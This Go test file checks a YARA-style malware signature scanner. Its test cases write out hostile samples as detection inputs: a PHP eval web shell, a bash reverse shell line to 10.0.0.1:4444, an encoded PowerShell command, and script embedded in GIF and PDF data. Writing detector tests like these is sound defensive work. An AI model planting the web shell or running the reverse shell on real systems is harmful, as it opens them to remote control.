package yara

import (
	"os"
	"path/filepath"
	"testing"
)

func TestDefaultEngineScan(t *testing.T) {
	e := Default()
	if e.RuleCount() == 0 {
		t.Fatal("default engine has no rules")
	}

	const eicar = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

	tests := []struct {
		name      string
		data      []byte
		wantRule  string // expected rule name (empty = expect no match)
		wantSever Severity
	}{
		{"clean text", []byte("just a normal harmless document body"), "", ""},
		{"empty", nil, "", ""},
		{"eicar", []byte(eicar), "eicar_test_file", SeverityCritical},
		{"php webshell", []byte(`<?php eval($_POST["x"]); ?>`), "php_webshell", SeverityCritical},
		{"php webshell upper", []byte(`<?php EVAL($_post["x"]); ?>`), "php_webshell", SeverityCritical},
		{"elf magic", []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01}, "elf_executable", SeverityHigh},
		{"windows pe", []byte("MZ........This program cannot be run in DOS mode."), "windows_pe_dropper", SeverityHigh},
		{"reverse shell", []byte("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), "reverse_shell", SeverityHigh},
		{"pdf js", []byte("%PDF-1.7 ... /JavaScript (app.alert(1)) ..."), "pdf_javascript", SeverityMedium},
		{"html script", []byte(`GIF89a<script>alert(1)</script>`), "embedded_html_script", SeverityMedium},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			matches := e.Scan(tc.data)
			if tc.wantRule == "" {
				if len(matches) != 0 {
					t.Fatalf("expected no match, got %+v", matches)
				}
				return
			}
			if !hasRule(matches, tc.wantRule) {
				t.Fatalf("expected rule %q, got %+v", tc.wantRule, matches)
			}
			if got := HighestSeverity(matches); !got.AtLeast(tc.wantSever) {
				t.Fatalf("severity = %q; want at least %q", got, tc.wantSever)
			}
		})
	}
}

func TestPowerShellMatchAll(t *testing.T) {
	e := Default()
	// Both tokens present -> match.
	if m := e.Scan([]byte("powershell.exe -enc ZQBjAGgA")); !hasRule(m, "powershell_encoded_command") {
		t.Fatalf("expected powershell match, got %+v", m)
	}
	// Only one token present -> MatchAll should NOT fire.
	if m := e.Scan([]byte("powershell.exe Get-Process")); hasRule(m, "powershell_encoded_command") {
		t.Fatalf("MatchAll fired on partial match: %+v", m)
	}
}

func TestNewValidation(t *testing.T) {
	tests := []struct {
		name    string
		rules   []Rule
		wantErr bool
	}{
		{"empty name", []Rule{{Strings: []Pattern{{Text: "x"}}}}, true},
		{"no strings", []Rule{{Name: "r"}}, true},
		{"bad hex", []Rule{{Name: "r", Strings: []Pattern{{Hex: "zz"}}}}, true},
		{"empty pattern", []Rule{{Name: "r", Strings: []Pattern{{}}}}, true},
		{"valid", []Rule{{Name: "r", Strings: []Pattern{{Text: "x"}}}}, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			_, err := New(tc.rules)
			if (err != nil) != tc.wantErr {
				t.Fatalf("New() err = %v; wantErr = %v", err, tc.wantErr)
			}
		})
	}
}

func TestLoadFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "rules.json")
	content := `[{"name":"custom_secret_marker","severity":"high","strings":[{"text":"TOP_SECRET_PAYLOAD"}]}]`
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatalf("write rules: %v", err)
	}

	e, err := LoadFile(path)
	if err != nil {
		t.Fatalf("LoadFile: %v", err)
	}
	if e.RuleCount() != Default().RuleCount()+1 {
		t.Fatalf("expected built-ins + 1 custom rule, got %d", e.RuleCount())
	}
	if m := e.Scan([]byte("....TOP_SECRET_PAYLOAD....")); !hasRule(m, "custom_secret_marker") {
		t.Fatalf("custom rule did not match: %+v", m)
	}
}

func TestLoadFileErrors(t *testing.T) {
	if _, err := LoadFile(filepath.Join(t.TempDir(), "missing.json")); err == nil {
		t.Fatal("expected error for missing file")
	}
	dir := t.TempDir()
	bad := filepath.Join(dir, "bad.json")
	if err := os.WriteFile(bad, []byte("{not json"), 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}
	if _, err := LoadFile(bad); err == nil {
		t.Fatal("expected parse error for malformed JSON")
	}
}

func hasRule(matches []Match, name string) bool {
	for _, m := range matches {
		if m.Rule == name {
			return true
		}
	}
	return false
}
